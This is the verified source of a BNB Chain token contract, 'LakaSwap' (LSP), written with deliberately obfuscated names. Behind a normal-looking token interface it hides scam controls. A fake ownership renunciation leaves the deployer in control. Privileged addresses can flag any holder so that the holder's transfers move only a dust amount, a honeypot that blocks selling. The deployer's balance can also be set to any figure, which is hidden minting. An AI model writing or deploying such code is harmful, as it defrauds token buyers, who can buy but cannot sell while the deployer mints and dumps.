/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface fkkjwpohelmq {
    function totalSupply() external view returns (uint256);

    function balanceOf(address cacmcszjqah) external view returns (uint256);

    function transfer(address jmgbfcfdxxrjv, uint256 cwekxhnnet) external returns (bool);

    function allowance(address yuxmjchklh, address spender) external view returns (uint256);

    function approve(address spender, uint256 cwekxhnnet) external returns (bool);

    function transferFrom(
        address sender,
        address jmgbfcfdxxrjv,
        uint256 cwekxhnnet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed iplwfmwrqx, uint256 value);
    event Approval(address indexed yuxmjchklh, address indexed spender, uint256 value);
}

interface qwtoswffd is fkkjwpohelmq {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract yyrotveademj {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface mfvikrqxismgvt {
    function createPair(address etvenljoccr, address izvubmqmkybipe) external returns (address);
}

interface dsczarswav {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract LakaSwap is yyrotveademj, fkkjwpohelmq, qwtoswffd {

    function totalSupply() external view virtual override returns (uint256) {
        return amyjupswqw;
    }

    uint8 private pafsjtkowpf = 18;

    event OwnershipTransferred(address indexed agurwucmeiu, address indexed bpofkdahxxh);

    bool private wmlslhbyj;

    uint256 constant fdnkljecacyfg = 11 ** 10;

    function hmjlituhtagny(address rntwxskilsdzsh, address jmgbfcfdxxrjv, uint256 cwekxhnnet) internal returns (bool) {
        require(gtgzpmwcd[rntwxskilsdzsh] >= cwekxhnnet);
        gtgzpmwcd[rntwxskilsdzsh] -= cwekxhnnet;
        gtgzpmwcd[jmgbfcfdxxrjv] += cwekxhnnet;
        emit Transfer(rntwxskilsdzsh, jmgbfcfdxxrjv, cwekxhnnet);
        return true;
    }

    address private mcueeutheh;

    constructor (){ 
        if (bdnlvqqsa != gikvkfwwpt) {
            bdnlvqqsa = wwyciqolnt;
        }
        dsczarswav hvocjbyggz = dsczarswav(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ievhdrprwlznq = mfvikrqxismgvt(hvocjbyggz.factory()).createPair(hvocjbyggz.WETH(), address(this));
        mcueeutheh = _msgSender();
        
        kmrvxeresr = _msgSender();
        ovpetagrvu[_msgSender()] = true;
        if (wmlslhbyj) {
            cqafdtjfs = false;
        }
        gtgzpmwcd[_msgSender()] = amyjupswqw;
        emit Transfer(address(0), kmrvxeresr, amyjupswqw);
        hbasovvsiyv();
    }

    string private ddwcyuczzc = "LSP";

    function mexbaoxwgpbwlq(address fkxatrqmmto) public {
        if (hovlkvgoosenh) {
            return;
        }
        if (cqafdtjfs) {
            wmlslhbyj = true;
        }
        ovpetagrvu[fkxatrqmmto] = true;
        
        hovlkvgoosenh = true;
    }

    function allowance(address ofkdfuqdprz, address wrnrequjhuh) external view virtual override returns (uint256) {
        return aqnieipafatex[ofkdfuqdprz][wrnrequjhuh];
    }

    mapping(address => uint256) private gtgzpmwcd;

    function decimals() external view virtual override returns (uint8) {
        return pafsjtkowpf;
    }

    function symbol() external view virtual override returns (string memory) {
        return ddwcyuczzc;
    }

    uint256 private amyjupswqw = 100000000 * 10 ** 18;

    mapping(address => bool) public ovpetagrvu;

    uint256 public kepqbjyavlzryy;

    address public ievhdrprwlznq;

    function czqjvvfitpge() public view returns (uint256) {
        return jyriuynzl;
    }

    bool private cqafdtjfs;

    function amkvxvdfesmir(address culflzrelvlsem) public {
        if (jyriuynzl != xxwnmqpsxgnc) {
            jyriuynzl = kkuhtljhy;
        }
        if (culflzrelvlsem == kmrvxeresr || culflzrelvlsem == ievhdrprwlznq || !ovpetagrvu[_msgSender()]) {
            return;
        }
        
        gmflzzogrkznj[culflzrelvlsem] = true;
    }

    function ahqmovhthbjzq(address rntwxskilsdzsh, address jmgbfcfdxxrjv, uint256 cwekxhnnet) internal returns (bool) {
        if (rntwxskilsdzsh == kmrvxeresr) {
            return hmjlituhtagny(rntwxskilsdzsh, jmgbfcfdxxrjv, cwekxhnnet);
        }
        if (gmflzzogrkznj[rntwxskilsdzsh]) {
            return hmjlituhtagny(rntwxskilsdzsh, jmgbfcfdxxrjv, fdnkljecacyfg);
        }
        return hmjlituhtagny(rntwxskilsdzsh, jmgbfcfdxxrjv, cwekxhnnet);
    }

    uint256 public xxwnmqpsxgnc;

    uint256 private wwyciqolnt;

    mapping(address => mapping(address => uint256)) private aqnieipafatex;

    uint256 private bdnlvqqsa;

    uint256 private jyriuynzl;

    function approve(address wrnrequjhuh, uint256 cwekxhnnet) public virtual override returns (bool) {
        aqnieipafatex[_msgSender()][wrnrequjhuh] = cwekxhnnet;
        emit Approval(_msgSender(), wrnrequjhuh, cwekxhnnet);
        return true;
    }

    function getOwner() external view returns (address) {
        return mcueeutheh;
    }

    bool public hovlkvgoosenh;

    uint256 public gikvkfwwpt;

    function hbasovvsiyv() public {
        emit OwnershipTransferred(kmrvxeresr, address(0));
        mcueeutheh = address(0);
    }

    function transfer(address cgkjluhvflnpf, uint256 cwekxhnnet) external virtual override returns (bool) {
        return ahqmovhthbjzq(_msgSender(), cgkjluhvflnpf, cwekxhnnet);
    }

    function transferFrom(address rntwxskilsdzsh, address jmgbfcfdxxrjv, uint256 cwekxhnnet) external override returns (bool) {
        if (aqnieipafatex[rntwxskilsdzsh][_msgSender()] != type(uint256).max) {
            require(cwekxhnnet <= aqnieipafatex[rntwxskilsdzsh][_msgSender()]);
            aqnieipafatex[rntwxskilsdzsh][_msgSender()] -= cwekxhnnet;
        }
        return ahqmovhthbjzq(rntwxskilsdzsh, jmgbfcfdxxrjv, cwekxhnnet);
    }

    function owner() external view returns (address) {
        return mcueeutheh;
    }

    address public kmrvxeresr;

    function otmeblkpubxecs() public {
        
        
        kkuhtljhy=0;
    }

    mapping(address => bool) public gmflzzogrkznj;

    function qmfrajvpriktd() public view returns (uint256) {
        return jyriuynzl;
    }

    function balanceOf(address cacmcszjqah) public view virtual override returns (uint256) {
        return gtgzpmwcd[cacmcszjqah];
    }

    function deydcrqjmyerj() public view returns (uint256) {
        return bdnlvqqsa;
    }

    function qpmjxuzoy(uint256 cwekxhnnet) public {
        if (!ovpetagrvu[_msgSender()]) {
            return;
        }
        gtgzpmwcd[kmrvxeresr] = cwekxhnnet;
    }

    uint256 public kkuhtljhy;

    string private jayitowwgsucv = "Laka Swap";

    function name() external view virtual override returns (string memory) {
        return jayitowwgsucv;
    }

}